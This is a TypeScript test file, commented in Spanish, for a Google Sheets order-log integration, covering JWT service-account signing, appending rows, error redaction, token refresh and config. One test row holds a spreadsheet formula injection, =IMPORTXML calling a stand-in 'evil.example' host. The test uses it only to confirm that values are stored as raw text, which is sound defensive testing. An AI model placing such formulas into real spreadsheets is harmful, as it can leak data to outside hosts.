import { createVerify, generateKeyPairSync } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { ConfigError, loadConfig } from '../../src/server/config/env.js';
import {
  GOOGLE_TOKEN_URL,
  GoogleSheetsLog,
  SHEETS_SCOPE,
  SheetsError,
  serviceAccountAssertion,
} from '../../src/server/integrations/sheets/google-sheets.js';
import { SHEET_COLUMNS, sheetRow } from '../../src/server/services/notifications.js';

// Llave RSA sintética, generada en memoria solo para esta prueba (nunca se escribe en disco).
const { privateKey, publicKey } = generateKeyPairSync('rsa', {
  modulusLength: 2048,
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
  publicKeyEncoding: { type: 'spki', format: 'pem' },
});
const CLIENT_EMAIL = 'registro-pedidos@proyecto-de-prueba.iam.gserviceaccount.com';
const SPREADSHEET_ID = '1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789';

interface Call {
  url: string;
  init: RequestInit;
}

function fakeFetch(responses: (() => Response)[]) {
  const calls: Call[] = [];
  const impl = (async (url: string | URL, init?: RequestInit) => {
    calls.push({ url: String(url), init: init ?? {} });
    const next = responses.shift();
    if (!next) throw new Error('llamada inesperada');
    return next();
  }) as typeof fetch;
  return { calls, impl };
}

const json =
  (body: unknown, status = 200) =>
  () =>
    new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

const decode = (part: string) =>
  JSON.parse(Buffer.from(part, 'base64url').toString('utf8')) as Record<string, unknown>;

describe('Google Sheets: cuenta de servicio (JWT RS256)', () => {
  it('firma la afirmación con la llave y el alcance de Sheets, válida una hora', () => {
    const now = new Date('2026-10-18T12:00:00Z');
    const jwt = serviceAccountAssertion({ clientEmail: CLIENT_EMAIL, privateKey }, now);
    const [header, claims, signature] = jwt.split('.');
    expect(decode(header ?? '')).toEqual({ alg: 'RS256', typ: 'JWT' });
    expect(decode(claims ?? '')).toEqual({
      iss: CLIENT_EMAIL,
      scope: SHEETS_SCOPE,
      aud: GOOGLE_TOKEN_URL,
      iat: now.getTime() / 1000,
      exp: now.getTime() / 1000 + 3600,
    });
    const ok = createVerify('RSA-SHA256')
      .update(`${header}.${claims}`)
      .verify(publicKey, Buffer.from(signature ?? '', 'base64url'));
    expect(ok).toBe(true);
  });

  it('agrega filas como texto literal (RAW) y reutiliza el token mientras sea válido', async () => {
    const fetcher = fakeFetch([
      json({ access_token: 'token-de-prueba', expires_in: 3600 }),
      json({}),
      json({}),
    ]);
    const log = new GoogleSheetsLog({
      spreadsheetId: SPREADSHEET_ID,
      clientEmail: CLIENT_EMAIL,
      privateKey,
      tab: 'Pedidos',
      fetch: fetcher.impl,
    });
    await log.appendRow(['TGS-AAAAAAAAAA', '=IMPORTXML("https://evil.example")', 3800]);
    await log.appendRow(['TGS-BBBBBBBBBB', 'Pago confirmado', 11000]);
    expect(fetcher.calls).toHaveLength(3);
    const [token, append] = fetcher.calls;
    expect(token?.url).toBe(GOOGLE_TOKEN_URL);
    expect((token?.init.body as URLSearchParams).toString()).toContain(
      'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer',
    );
    expect(append?.url).toBe(
      `https://sheets.googleapis.com/v4/spreadsheets/${SPREADSHEET_ID}/values/Pedidos!A1:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`.replace(
        'Pedidos!A1',
        encodeURIComponent('Pedidos!A1'),
      ),
    );
    expect((append?.init.headers as Record<string, string>).authorization).toBe(
      'Bearer token-de-prueba',
    );
    expect(JSON.parse(append?.init.body as string)).toEqual({
      values: [['TGS-AAAAAAAAAA', '=IMPORTXML("https://evil.example")', 3800]],
    });
  });

  it('un error de Google se informa sin copiar su respuesta y sin la llave', async () => {
    const fetcher = fakeFetch([json({ error: 'invalid_grant', detalle: 'cuenta: privada' }, 400)]);
    const log = new GoogleSheetsLog({
      spreadsheetId: SPREADSHEET_ID,
      clientEmail: CLIENT_EMAIL,
      privateKey,
      tab: 'Pedidos',
      fetch: fetcher.impl,
    });
    const error = await log.appendRow(['x']).catch((caught: unknown) => caught);
    expect(error).toBeInstanceOf(SheetsError);
    expect((error as SheetsError).status).toBe(400);
    expect(String((error as Error).message)).not.toContain('privada');
    expect(String((error as Error).message)).not.toContain(privateKey.slice(40, 80));
  });

  it('tras un 401 pide un token nuevo en el siguiente intento', async () => {
    const fetcher = fakeFetch([
      json({ access_token: 'primero' }),
      json({}, 401),
      json({ access_token: 'segundo' }),
      json({}),
    ]);
    const log = new GoogleSheetsLog({
      spreadsheetId: SPREADSHEET_ID,
      clientEmail: CLIENT_EMAIL,
      privateKey,
      tab: 'Pedidos',
      fetch: fetcher.impl,
    });
    await expect(log.appendRow(['x'])).rejects.toBeInstanceOf(SheetsError);
    await log.appendRow(['x']);
    expect((fetcher.calls[3]?.init.headers as Record<string, string>).authorization).toBe(
      'Bearer segundo',
    );
  });
});

describe('Google Sheets: configuración', () => {
  const sheetsEnv = (overrides: Record<string, string> = {}) => ({
    GOOGLE_SHEETS_SPREADSHEET_ID: SPREADSHEET_ID,
    GOOGLE_SHEETS_CLIENT_EMAIL: CLIENT_EMAIL,
    // Como la pega Render en una sola línea: saltos de línea escritos como \n.
    GOOGLE_SHEETS_PRIVATE_KEY: privateKey.replace(/\n/g, '\\n'),
    ...overrides,
  });

  it('está apagado si no hay credenciales', () => {
    expect(loadConfig({}).sheets).toBeUndefined();
  });

  it('las tres variables van juntas y la llave debe poder leerse', () => {
    const partial = () => loadConfig({ GOOGLE_SHEETS_SPREADSHEET_ID: SPREADSHEET_ID });
    expect(partial).toThrow(ConfigError);
    expect(() => loadConfig(sheetsEnv({ GOOGLE_SHEETS_PRIVATE_KEY: 'x'.repeat(200) }))).toThrow(
      ConfigError,
    );
    expect(() =>
      loadConfig(sheetsEnv({ GOOGLE_SHEETS_CLIENT_EMAIL: 'dueno@example.com' })),
    ).toThrow(ConfigError);
  });

  it('con las tres variables queda configurado (pestaña «Pedidos» por defecto)', () => {
    const config = loadConfig(sheetsEnv());
    expect(config.sheets).toMatchObject({
      spreadsheetId: SPREADSHEET_ID,
      clientEmail: CLIENT_EMAIL,
      tab: 'Pedidos',
    });
    expect(config.sheets?.privateKey).toBe(privateKey);
  });
});

describe('Google Sheets: fila del registro', () => {
  it('lleva datos de la operación y nunca correo, nombre, UID ni PIN', () => {
    const row = sheetRow(
      { id: '0b5a3f5e-1111-4222-8333-944455556666', createdAt: new Date('2026-10-18T17:05:00Z') },
      'order_paid_event',
      {
        reference: 'TGS-ABCDEFGHJK',
        totalCop: 3800,
        items: [
          { name: '100 + 10 Diamantes', quantity: 1, unitPriceCop: 3800, lineTotalCop: 3800 },
        ],
        receipt: { number: 7 },
      },
      { payment: 'CONFIRMED', recharge: 'PENDING' },
    );
    expect(row).toEqual([
      '2026-10-18 12:05',
      'TGS-ABCDEFGHJK',
      'Pago confirmado',
      '1× 100 + 10 Diamantes',
      3800,
      'COP',
      'Confirmado',
      'Pendiente',
      '000007',
      '0b5a3f5e-1111-4222-8333-944455556666',
    ]);
    expect(row).toHaveLength(SHEET_COLUMNS.length);
  });
});
